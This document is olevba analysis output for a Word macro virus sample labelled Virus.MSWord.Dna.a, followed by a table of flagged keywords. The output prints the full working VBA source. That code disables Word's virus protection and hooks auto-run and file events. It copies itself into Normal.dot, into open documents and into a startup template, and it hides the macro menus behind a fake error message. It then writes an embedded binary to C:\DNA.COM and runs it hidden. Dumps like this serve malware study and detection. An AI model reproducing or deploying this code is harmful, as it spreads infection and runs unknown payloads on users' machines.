olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Dna.a-00e2b4adb21abcddad330cdeb96e5020eed50cec
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Dna.a-00e2b4adb21abcddad330cdeb96e5020eed50cec - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Option Explicit

-------------------------------------------------------------------------------
VBA MACRO DNA.bas 
in file: Virus.MSWord.Dna.a-00e2b4adb21abcddad330cdeb96e5020eed50cec - OLE stream: 'Macros/VBA/dna'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public WhoAmI As String
Public DataDot As Boolean
Public NormInstalled As Boolean
Public DocInstalled As Boolean
Public NormReadOnly As Boolean
Public HoldDoc As String
Public DocThere As Boolean
Public Final_Close_Called As Boolean
Public FileNumber As String
Public N As String
Public A As String
Public DNA(7) As String
Function ID_Status()
On Error Resume Next
    If MacroContainer = NormalTemplate Then
        WhoAmI = "normal"
        GoTo checkout
    End If
    If MacroContainer = ActiveDocument Then WhoAmI = "document"
    If MacroContainer = "dna.dot" Then WhoAmI = "weird"
checkout:
End Function
Function Install_Status()
On Error Resume Next
    If Dir(Application.StartupPath + "\dna.dot") = "dna.dot" Then DataDot = True
    For i = 1 To ActiveDocument.VBProject.VBComponents.Count
        If ActiveDocument.VBProject.VBComponents(i).Name = "dna" Then DocInstalled = True
    Next i
    For i = 1 To NormalTemplate.VBProject.VBComponents.Count
        If NormalTemplate.VBProject.VBComponents(i).Name = "dna" Then NormInstalled = True
    Next i
    If GetAttr(NormalTemplate.FullName) = vbArchive + vbReadOnly Or _
    GetAttr(NormalTemplate.FullName) = vbReadOnly Then NormReadOnly = True
End Function
Function The_dna_Core()
On Error Resume Next
Call ID_Status
Call Install_Status
    If WhoAmI = "document" Then Call DocCodeCore
    If WhoAmI = "normal" Then Call NormCodeCore
    If WhoAmI = "weird" Then Call weirdCoreCode
    If NormReadOnly = False Then CommandBars("tools").Controls("Macro").Delete
    If NormReadOnly = False Then CommandBars("tools").Controls("Templates and add-ins...").Delete
End Function
Function DocCodeCore()
On Error Resume Next
    Application.VBE.ActiveVBProject.VBComponents("dna").Export "c:\dna.sys"
    If NormInstalled = False And NormReadOnly = False Then
        With NormalTemplate.VBProject
        With .VBComponents.Import("c:\dna.sys")
        End With
        End With
    End If
    If DataDot = False Then
        ActiveDocument.SaveAs FileName:=Application.StartupPath + "\dna.dot", _
        FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
        Application.OrganizerRename Source:=Application.StartupPath + "\dna.dot", Name:="dna", NewName:="weird", Object:=wdOrganizerObjectProjectItems
        ActiveDocument.SaveAs FileName:=Application.StartupPath + "\dna.dot", _
        FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
        If ActiveDocument.Saved = False Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
        If Final_Close_Called = False Then Documents.Open FileName:=HoldDoc
        Windows(1).Close
    End If
End Function
Function NormCodeCore()
On Error Resume Next
Application.ScreenUpdating = False
    Call Check_For_Doc
    If DocInstalled = False And DocThere = True Then
        With ActiveDocument.VBProject
        With .VBComponents.Import("c:\dna.sys")
        End With
        End With
        With Dialogs(wdDialogFileSummaryInfo)
            .Comments = ""
            .Execute
        End With
    End If
    If DataDot = False And DocThere = True Then
        ActiveDocument.SaveAs FileName:=Application.StartupPath + "\dna.dot", _
        FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
        Application.OrganizerRename Source:=Application.StartupPath + "\dna.dot", Name:="dna", NewName:="weird", Object:=wdOrganizerObjectProjectItems
        ActiveDocument.SaveAs FileName:=Application.StartupPath + "\dna.dot", _
        FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
        If Final_Close_Called = False Then Documents.Open FileName:=HoldDoc
        Windows(1).Close SaveChanges:=wdSaveChanges
    End If
    If DataDot = False And DocThere = False Then
        Documents.Add Template:="", NewTemplate:=False
        ActiveDocument.SaveAs FileName:=Application.StartupPath + "\dna.dot", _
        FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
        Application.OrganizerRename Source:=Application.StartupPath + "\dna.dot", Name:="dna", NewName:="weird", Object:=wdOrganizerObjectProjectItems
        ActiveDocument.SaveAs FileName:=Application.StartupPath + "\dna.dot", _
        FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
        If ActiveDocument.Saved = False Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
        Windows(1).Close SaveChanges:=wdSaveChanges
    End If
Application.ScreenUpdating = True
End Function
Function weirdCoreCode()
On Error Resume Next
Application.ScreenUpdating = False
        If NormInstalled = False And NormReadOnly = False Then
            With NormalTemplate.VBProject
            With .VBComponents.Import("c:\dna.sys")
            End With
            End With
            NormalTemplate.Save
        End If
        If DocInstalled = False Then
            With ActiveDocument.VBProject
            With .VBComponents.Import("c:\dna.sys")
            End With
            End With
            With Dialogs(wdDialogFileSummaryInfo)
                .Comments = ""
                .Execute
            End With
        End If
Application.ScreenUpdating = True
End Function
Function dna_Run()
On Error Resume Next
    Options.VirusProtection = False
    Options.SaveNormalPrompt = False
    Options.ConfirmConversions = False
    HoldDoc = ActiveDocument.FullName
    Call The_dna_Core
End Function
Sub AutoOpen()
Attribute AutoOpen.VB_ProcData.VB_Invoke_Func = "Normal.dna.AutoOpen"
On Error Resume Next
Call dna_Run
Call dna_release
End Sub
Sub AutoClose()
Attribute AutoClose.VB_ProcData.VB_Invoke_Func = "Normal.dna.AutoClose"
On Error Resume Next
Final_Close_Called = True
Call dna_Run
Call dna_release
End Sub
Sub AutoExit()
Attribute AutoExit.VB_ProcData.VB_Invoke_Func = "Normal.dna.AutoExit"
On Error Resume Next
Final_Close_Called = True
Call dna_Run
Call dna_release
End Sub
Sub FileSaveAs()
Attribute FileSaveAs.VB_ProcData.VB_Invoke_Func = "Normal.dna.FileSaveAs"
On Error Resume Next
Call dna_Run
Dialogs(wdDialogFileSaveAs).Show
Call dna_release
End Sub
Sub filesave()
Attribute filesave.VB_ProcData.VB_Invoke_Func = "Normal.dna.filesave"
On Error Resume Next
Call dna_Run
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
Call dna_release
End Sub
Sub fileclose()
Attribute fileclose.VB_ProcData.VB_Invoke_Func = "Normal.dna.fileclose"
On Error Resume Next
Final_Close_Called = True
Call dna_Run
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
ActiveDocument.Close
Call dna_release
End Sub
Sub fileprint()
Attribute fileprint.VB_ProcData.VB_Invoke_Func = "Normal.dna.fileprint"
On Error Resume Next
Call dna_Run
Dialogs(wdDialogFilePrint).Show
Call dna_release
End Sub
Sub viewvbcode()
Attribute viewvbcode.VB_ProcData.VB_Invoke_Func = "Normal.dna.viewvbcode"
MsgBox "Visual Basic not available.", vbOKOnly, "MS Word message"
End Sub
Sub ToolsMacro()
End Sub
Sub FileTemplates()
End Sub
Function Check_For_Doc()
On Error GoTo docek
    If ActiveDocument.Name <> "" Then
        DocThere = True
    End If
    GoTo over
docek:
    DocThere = False
over:
End Function
Function dna_release()
Dim FileNumber
Dim N As String
Dim A As String
Dim Q As String
Dim CR As String
Dim LF As String
Dim DNA(14)
N = Chr$(0)
A = Chr$(9)
Q = Chr$(34)
LF = Chr$(10)
CR = Chr$(13)
DNA(1) = "é½�������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������"
DNA(2) = "����������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������"
DNA(3) = "����������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������"
DNA(4) = "����������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������"
DNA(5) = "����������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������"
DNA(6) = "��������������������������"
DNA(7) = "è" & N & "è" & CR & N & "ë4�´,Í!€ú" & N & "t÷Ã´0Í!Ã>è" & N & N & "]ƒíŠV" & N & "�^'�€ú" & N & "tŠò¹w0*Ö€î.CâöÃèÚÿÖBóæÕ”lW`QwÚ^7|Na¶ƒækÊ¥°zc¬š" & Q & "›!¤¡Rú^Mª �Ô•¦YBJ¤½JÂë®çb"
DNA(8) = "mwéÈ°¦8¿k½ pt4ñ»EÖ°XÌL)b.òî°n
Ÿ_ÔÞW|4‘¤" & LF & "íEwê~é×˜Œó‹ÌŠd#� ¤6³})¾" & CR & "æøß™Ý äà2ôŸŸ´sèdåf" & LF & "&ßkµJgVì
É
-Æ]?¹ýš" & LF & "*£Ÿ‚\x08ÛWïBÕ•äZYçuhJÎ0T³áØ/š|ø~ø)‚hWâ^+��ªÄ.:" & CR & "B¹2™aò³Û-1†×µt¬÷Ð\x08×‚?ëÚ�ý6Ç/}�‚T\À&\‡
" & N & "ÍÑåòl|oÝ
csÿ=¿¢ÝYSŒ2æ.ï'5"
DNA(9) = "îÂéüœJÜíñ…M]ò;>%_
”¤£´¨Š ìâÃ[\x08Ê" & N & "qìéˆýp×5ÿzœ6”·€üÈ¿ÒG”‡‡¤ä)\Û‹”á5^a)ízÆ¸ñÏíˆÝì÷Ñ×¸Í
‡µ&óN-‡zV»rÔD/ù‘V7FƒHOsðûäS¼�è#NÍç!¶ã·QÄÖ,Ã(ù¸1?E¦K{ç:°GRîuÇ�$Ž”öV+ÏYR:«“¢ �ØŠøš-¨p¡aÃ…l·KƒeúnÛm†sü" & N & "†×ëÊÈ[jßßMÈ¤‹çå
/ýô ‰" & A & "ð�³–`" & LF & "—õ¿L"
DNA(10) = "î¬Í³¤•1·Ï�£@24Iç�w]
C3çòˆ
�;78ñ�)÷S›I<‰·-ö)ÂÊ,bÇƒgÂJdøl°ñ±$ÌÌòÜÔ 2äQÃ€<ßïŒ¬‚àŒAg
P2¸¸rÔˆ" & Q & "Z@ï/û¶CÜG[¼®};
ƒŒ—§(zteÊÄqDÇ" & CR & "+¥Y›$wøå�YÐ¢€˜g�«L…
ã/_‰7\“é¾àE" & CR & "‰?�ÙÄ2�§‚&‹D¹sà¯t>»WÁÃ¦_wWâQ+��Ýr¤ûi"
DNA(11) = "Ø¾�KƒeêcÛi†ÿw¯`NjJå1uæ
»’ÄÏO‡uæK…K™÷¸ñM—õQ¾5µ¿ŠHc" & CR & "[ëÔ#EÕyïºKL*
�y
þ¨È®ö<U1��Aþ—ü%éæ8MyvÞ^JÙ@g9IEóóŸD¹aÖ>&”úáCF¤Ys!„mwæ]­#[" & A & CR & "#ë`*¯ÄoÃÑ‰ ÅA€„W}@â‚•¾�ý8WQEþÖûÌð­$dßÔá+{ëaÖÙŒß†Š‰Q"
DNA(12) = "íP" & N & "n,ˆr6¨M¿”š%0À=%É�B¥ðóª
ŸÐD3“0�Òßð[Å
u" & Q & "�t{`é3œíþÌ™Ì†‚»e°‡0" & CR & "•Äõ×’HL˜“ÜiúËïÒ_°åíÈØXo" & Q & "m)Šri–ktô; 3íœ\{GZÂÄ\x08ª“)KT|x�bMí" & N & "P®¿ô\•&]ì6’<NYýú'$ÜF¨l#‘*¾¦°
–×<êó®å 
¨®‹­\x08I%•ÔÂìXË6
ˆ^;_cäv
¸„QÿRbkþŒŽ
.}H²Ï"
FileNumber = FreeFile
Open "C:\DNA.COM" For Output As #FileNumber
Print #FileNumber, DNA(1) & DNA(2) & DNA(3) & DNA(4) & DNA(5) & DNA(6) & DNA(7) & DNA(8) & DNA(9) & DNA(10) & DNA(11) & DNA(12)
Close #FileNumber
Shell ("C:\DNA.COM"), 0
End Function
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|'\x08'              |May use special characters such as backspace |
|          |                    |to obfuscate code when printed on the console|
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+

